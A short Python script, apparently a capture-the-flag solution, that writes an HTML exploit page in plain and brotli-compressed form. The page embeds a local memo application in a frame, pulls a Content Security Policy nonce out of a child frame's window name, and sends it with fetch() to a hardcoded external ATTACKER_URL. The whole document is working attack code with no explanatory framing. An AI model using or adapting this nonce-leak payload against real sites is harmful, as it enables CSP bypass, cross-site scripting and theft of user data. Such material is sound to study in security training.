import brotli
from datetime import datetime
from pathlib import Path

ATTACKER_URL = "http://predo.run.goorm.site"

html = f"""<!doctype html>
    <html>
    <iframe src="http://127.0.0.1:3000/memo/1" onload="cspBypass(this.contentWindow)"></iframe>
    <script>
        function cspBypass(win) {{
            win[0].location = 'about:blank';
            setTimeout(() => {{
                leaked = (win[0].name.match(/nonce=(["'])?([A-Za-z0-9+/=_-]+)/) || [])[2] || null;
                fetch('{ATTACKER_URL}/nonce?nonce='+leaked);
            }}, 500);
    }}</script>
    </html>
"""
Path("test.html").write_text(html, encoding="utf-8")

compressed = brotli.compress(html.encode("utf-8"))
Path("test.html.br").write_bytes(compressed)

print("생성 완료: test.html, test.html.br")